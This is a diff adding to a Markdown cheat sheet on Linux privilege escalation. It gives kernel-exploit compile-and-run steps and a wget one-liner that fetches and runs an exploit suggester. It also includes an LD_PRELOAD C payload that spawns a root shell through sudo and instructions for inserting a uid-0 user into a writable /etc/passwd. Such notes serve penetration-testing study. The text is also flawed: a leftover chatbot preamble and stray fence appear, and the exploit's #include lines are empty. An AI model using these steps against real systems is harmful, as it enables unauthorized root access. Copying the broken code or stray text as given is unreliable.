@@ -1,3 +1,6 @@
+Here is the content formatted in Markdown (MD):
+
+```markdown
 # Linux Privilege Escalation Enumeration
 
 ## Basic Enumeration
@@ -114,10 +117,104 @@ To find groups and users in those groups, use:
 ```
 cat /etc/group
 ```
-This lists all groups on the system along with their associated users.
 
-To find the users in the group, use:
+To find users in a specific group:
 ```
-ahmed💀ahmed:~$  getent group sudo(group name)
+getent group sudo   # Replace "sudo" with your group name
+```
+Example output:
+```
 sudo:x:27:ahmed
 ```
+
+---
+
+## Kernel Exploits
+
+### Exploit Example Using GCC
+1. Use `uname -a` to find kernel details.
+2. Search for an exploit online matching your kernel version.
+3. Compile a C exploit file using:
+   ```
+   gcc filename.c -o filename && chmod +x filename && ./filename
+   ```
+4. Run it to escalate privileges.
+
+### Using Linux Exploit Suggester
+Download and run Linux Exploit Suggester:
+```
+wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh && chmod +x ./les.sh && ./les.sh
+```
+Example output:
+```
+Kernel version: 6.12.13
+Architecture: x86_64
+
+Possible Exploits:
+
+[+] [CVE-2022-2586] nft_object UAF
+    Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
+
+[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
+    Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
+```
+
+---
+
+## Shared Libraries Exploitation
+
+If `sudo -l` reveals `env_keep+=LD_PRELOAD`, you can exploit shared libraries.
+
+1. Check shared libraries for a binary using:
+   ```
+   ldd /usr/bin/openssl   # Replace with your binary path.
+   ```
+2. Create an exploit file (`exploit.c`) like this:
+   ```
+   #include 
+   #include 
+   #include 
+   #include 
+
+   void _init() {
+       unsetenv("LD_PRELOAD");
+       setgid(0);
+       setuid(0);
+       system("/bin/bash");
+   }
+   ```
+3. Compile it as a shared library:
+   ```
+   gcc -fPIC -shared -o exploit.so exploit.c -nostartfiles
+   ```
+4. Execute it using:
+   ```
+   sudo LD_PRELOAD=/path/to/exploit.so openssl
+   ```
+
+---
+
+## Using `/etc/passwd`
+
+1. Check `/etc/passwd` for writable permissions:
+   ```
+   ls -lah /etc/passwd 
+   ```
+2. Generate a password hash using OpenSSL:
+   ```
+   openssl passwd 12345    # Replace "12345" with your password.
+   ```
+3. Edit `/etc/passwd`, replacing `x` in `root:x:` with your hash or adding a new user entry like this:
+   ```
+   newuser:$1$oEIT0M6j$sludhsYV1KW0pLn1tRIt61:0:0::/root:/bin/bash
+   ```
+
+Alternatively, if `/etc/shadow` is readable, extract hashes and crack them using tools like Hashcat or John.
+
+To create a password hash for `/etc/shadow`, use:
+```
+mkpasswd -m sha-512 newpassword    # SHA-512 is commonly used in `/etc/shadow`.
+```
+```
+
+---
